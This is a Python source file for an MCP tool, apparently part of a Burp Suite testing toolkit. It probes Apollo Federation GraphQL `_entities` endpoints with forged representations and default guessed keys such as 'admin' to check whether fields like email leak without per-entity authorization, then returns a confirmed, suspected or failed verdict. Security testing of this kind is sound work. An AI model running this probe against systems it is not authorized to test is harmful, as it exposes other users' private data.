"""probe_graphql_entities_injection — Apollo Federation _entities cross-subgraph blind exfil.

Apollo Federation exposes `_entities(representations: [_Any!]!)` as the gateway
mechanism to resolve types across subgraphs. The `representations` list is
operator-controlled — each entry must have `__typename` + key fields. When
subgraphs trust gateway-provided representations and skip per-key authz, an
attacker who forges representations exfils data they shouldn't see.

Strategy:
  - Send `_entities` with crafted representations targeting each subgraph
    type, varying the key fields (id, slug, email).
  - CONFIRMED on non-null `_entities[i]` return for IDs the attacker shouldn't
    own.
  - SUSPECTED on error message disclosing internal subgraph routing.

Returns VerdictResult.
"""

from __future__ import annotations

import json

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client
from burpsuite_mcp.tools.testing._verdict import make_verdict, error_verdict


_ENTITIES_QUERY = """
query PraetorEntitiesProbe($reps: [_Any!]!) {
  _entities(representations: $reps) {
    __typename
    ... on %s { %s }
  }
}
""".strip()


def register(mcp: FastMCP) -> None:

    @mcp.tool()
    async def probe_graphql_entities_injection(
        graphql_url: str,
        type_name: str,
        key_field: str,
        leak_field: str,
        forged_keys: list[str] | None = None,
        session: str = "",
        bearer_token: str = "",
    ) -> dict:
        """Probe Federation `_entities` for cross-subgraph blind exfil.

        Crafts representations targeting `type_name` with attacker-supplied
        `key_field` values; reads `leak_field` from each.

        CONFIRMED if `_entities[i].<leak_field>` returns non-null for forged
        keys (data leaked despite no direct authz path).

        Args:
            graphql_url: GraphQL endpoint URL (usually federated gateway).
            type_name: target Federation entity type, e.g. "User".
            key_field: declared @key field name, e.g. "id".
            leak_field: scalar field to attempt reading, e.g. "email".
            forged_keys: list of key values to try (default ["1", "2", "admin",
                "00000000-0000-0000-0000-000000000001"]). Operator should
                supply IDs the test account shouldn't own.
            session: optional session name.
            bearer_token: optional Bearer token.

        Returns: VerdictResult.
        """
        if not graphql_url or not type_name or not key_field or not leak_field:
            return error_verdict(
                "graphql_url, type_name, key_field, leak_field all required",
                vuln_type="graphql_entities_injection",
            )

        keys = forged_keys or ["1", "2", "admin",
                               "00000000-0000-0000-0000-000000000001"]
        query = _ENTITIES_QUERY % (type_name, leak_field)
        representations = [{"__typename": type_name, key_field: k} for k in keys]
        variables = {"reps": representations}

        resp = await _send(graphql_url, query, variables, session, bearer_token)
        logger_idx = resp.get("logger_index", -1)
        logger_indices = [logger_idx] if isinstance(logger_idx, int) and logger_idx >= 0 else []

        body = resp.get("response_body", "") or ""
        obj = _parse_json(body)

        reproductions = [{
            "variant": "entities_forged_representations",
            "status_code": resp.get("status_code"),
            "logger_index": logger_idx,
            "keys_tried": keys,
        }]

        leaks: list[dict] = []
        if obj and isinstance(obj.get("data"), dict):
            entities = obj["data"].get("_entities")
            if isinstance(entities, list):
                for k, ent in zip(keys, entities):
                    if isinstance(ent, dict) and ent.get(leak_field) is not None:
                        leaks.append({
                            "key": k,
                            "leak_field": leak_field,
                            "value_excerpt": str(ent.get(leak_field))[:120],
                        })

        if leaks:
            return make_verdict(
                "CONFIRMED", 0.86,
                f"`_entities` cross-subgraph leak on type `{type_name}` — "
                f"{len(leaks)}/{len(keys)} forged representations returned "
                f"`{leak_field}`. Subgraph trusts gateway-provided keys; "
                f"per-entity authz missing.",
                vuln_type="graphql_entities_injection",
                logger_indices=logger_indices,
                reproductions=reproductions,
                details={"leak_count": len(leaks), "leaks": leaks[:10]},
                summary=f"CONFIRMED Federation _entities leak on {type_name}.{leak_field}",
            )

        if obj and "errors" in obj:
            errs = json.dumps(obj["errors"])[:400]
            if "subgraph" in errs.lower() or "downstream" in errs.lower():
                return make_verdict(
                    "SUSPECTED", 0.50,
                    f"`_entities` error disclosed subgraph routing — investigate "
                    f"per-key authz manually.",
                    vuln_type="graphql_entities_injection",
                    logger_indices=logger_indices,
                    reproductions=reproductions,
                    details={"errors_excerpt": errs},
                    summary=f"SUSPECTED Federation entities surface on {type_name}",
                )

        return make_verdict(
            "FAILED", 0.10,
            "_entities query returned no leaked fields",
            vuln_type="graphql_entities_injection",
            logger_indices=logger_indices,
            reproductions=reproductions,
            summary=f"FAILED — no _entities leak on {type_name}",
        )


async def _send(url: str, query: str, variables: dict, session: str, bearer: str) -> dict:
    headers = [{"name": "Content-Type", "value": "application/json"}]
    if bearer:
        headers.append({"name": "Authorization", "value": f"Bearer {bearer}"})
    body = {"query": query, "variables": variables}
    if session:
        return await client.post("/api/session/request", json={
            "session": session, "method": "POST", "url": url,
            "headers": headers, "json_body": body,
        })
    return await client.post("/api/http/curl", json={
        "method": "POST", "url": url,
        "headers": headers, "json_body": body,
    })


def _parse_json(body: str) -> dict | None:
    if not body:
        return None
    try:
        obj = json.loads(body)
        return obj if isinstance(obj, dict) else None
    except json.JSONDecodeError:
        return None
